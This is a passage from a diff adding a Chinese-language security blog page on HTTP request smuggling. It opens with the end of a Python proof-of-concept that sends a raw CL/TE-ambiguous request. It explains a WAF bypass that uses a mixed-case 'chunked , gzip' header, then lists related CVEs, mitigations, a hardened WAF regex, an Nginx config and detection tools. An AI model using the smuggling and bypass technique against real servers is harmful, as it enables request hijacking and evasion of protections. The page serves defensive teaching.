+    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">raw</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;latin1&#39;</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;ignore&#39;</span><span class="p">))</span>
+</code></pre></div>
+
+<p>要点拆解：</p>
+<ul>
+<li>同时给出 <code>Transfer-Encoding</code> 与 <code>Content-Length</code>，制造 CL/TE 共存歧义。</li>
+<li><code>chunked , gzip</code> 这种混合写法让大小写敏感的 WAF 正则不命中 <code>chunked</code>，而后端按不敏感匹配仍走分块。</li>
+<li><code>0\r\n\r\n</code> 终止分块，前端若按 CL 读 52 字节会把后续受害者请求"吸"进来，实现夹带。</li>
+<li>用 <code>latin1</code> 编码发送，保证 <code>\r\n</code> 等控制字节精确，不被 UTF-8 转换破坏偏移。</li>
+</ul>
+<h2>八、真实 CVE 汇总</h2>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CVE-2023-25690</td>
+<td>Apache mod_proxy 请求拆分走私</td>
+</tr>
+<tr>
+<td>CVE-2023-25950</td>
+<td>HAProxy HTX 解析器不当处理</td>
+</tr>
+<tr>
+<td>CVE-2022-41721</td>
+<td>Go MaxBytesHandler 残留 body 解析为 HTTP/2 帧</td>
+</tr>
+<tr>
+<td>CVE-2026-26961</td>
+<td>Rack 贪婪式 multipart boundary 解析</td>
+</tr>
+</tbody>
+</table>
+<p>这些 CVE 的共同点是"前端与后端对请求边界认知不一致"。修复方向也都指向同一处：归一化解析、剥离用户提供的长度头、连接隔离。</p>
+<h2>九、检测与防御方案</h2>
+<h3>9.1 协议层防御</h3>
+<ol>
+<li><strong>端到端 HTTP/2</strong>：消除降级翻译环节，HTTP/2 帧长度天然无歧义。</li>
+<li><strong>生成有效 Content-Length 并剥离用户提供的 CL/TE 头</strong>：前端重新计算长度，丢弃客户端原始的 CL/TE，杜绝夹带。</li>
+<li><strong>前端归一化 + 后端拒绝歧义</strong>：前端把请求规范化为单一形式，后端对仍带歧义（如同时出现 CL 和 TE）的请求直接 400 拒绝。</li>
+<li><strong>连接隔离</strong>：一请求一连接，不复用 keep-alive 连接，根除"残留字节拼到下个请求"的土壤。</li>
+<li><strong>剥离 Upgrade 头</strong>：阻断 h2c 与 WebSocket 升级走私隧道。</li>
+</ol>
+<h3>9.2 WAF 规则加固</h3>
+<p>WAF 正则必须覆盖大小写与空白变体，否则大小写混淆与空白污染会直接失效：</p>
+<div class="highlight"><pre><span></span><code><span class="gh">#</span> 扩展正则覆盖大小写和空白
+(?i)Transfer\s*-\s*Encoding\s*:\s*.*chunked
+</code></pre></div>
+
+<p>要点：<code>(?i)</code> 忽略大小写、<code>\s*</code> 容忍头名与冒号周围的任意空白、<code>.*</code> 容忍逗号后的额外 token。还要对重复头、行内注入换行做专门拦截。</p>
+<h3>9.3 Nginx 加固配置</h3>
+<div class="highlight"><pre><span></span><code><span class="k">proxy_set_header</span><span class="w"> </span><span class="s">Upgrade</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
+<span class="k">proxy_set_header</span><span class="w"> </span><span class="s">Connection</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
+<span class="k">proxy_set_header</span><span class="w"> </span><span class="s">Transfer-Encoding</span><span class="w"> </span><span class="s">&quot;&quot;</span><span class="p">;</span>
+</code></pre></div>
+
+<p>显式清空 <code>Upgrade</code>、<code>Connection</code>、<code>Transfer-Encoding</code> 三个头，阻断升级走私与分块歧义。配合 <code>proxy_http_version 1.1</code> 与连接隔离可进一步收敛攻击面。</p>
+<h3>9.4 检测工具</h3>
+<ul>
+<li><strong>Burp Request Smuggler</strong>：Burp 插件，自动化探测 CL.TE / TE.CL / TE.TE。</li>
+<li><strong>OWASP Smuggler</strong>：命令行批量检测走私面。</li>
+<li><strong>h2cSmuggler</strong>：专门针对 h2c 升级走私。</li>
+<li><strong>nmap NSE http-smuggle</strong>：集成进 nmap 的走私检测脚本。</li>
+</ul>
+<h3>9.5 纵深防御一句话</h3>
+<blockquote>
+<p>所有走私与绕过的根，都是"两套解析器对同一段字节流给出不同解释"。任何让前端与后端解析行为对齐的措施，都是治本之策；任何只在前端做检测、后端信任转发的架构，都天然存在绕过空间。</p>
+</blockquote>
+<h2>免责声明</h2>
+<p>本文所涉技术内容（包括编码变异、解析差异、HTTP 请求走私、协议走私链、PoC 代码及绕过手法）仅用于网络安全防御研究、授权渗透测试、安全教学与产品加固参考。所有 PoC 与示例均针对假想的测试目标，不针对任何真实生产系统。未经授权对他人系统进行扫描、测试或攻击属于违法行为，可能违反《中华人民共和国网络安全法》《中华人民共和国刑法》第二百八十五条、第二百八十六条及所在司法管辖区的相关法律，作者不承担任何因不当使用本文内容而产生的法律责任。读者应在获得明确书面授权的前提下，于自有或授权环境中进行验证，并对自身行为的合规性负全部责任。文中提及的 CVE 编号、厂商产品及具体参数仅为技术说明，不代表对任何厂商的负面评价，相关漏洞应以厂商官方公告为准。</p>
+<div class="back"><a href="../">← Back to Home</a></div>
+</article>
+</main>
+<footer>Powered by GitHub Pages 2026</footer>
+</body>
+</html>
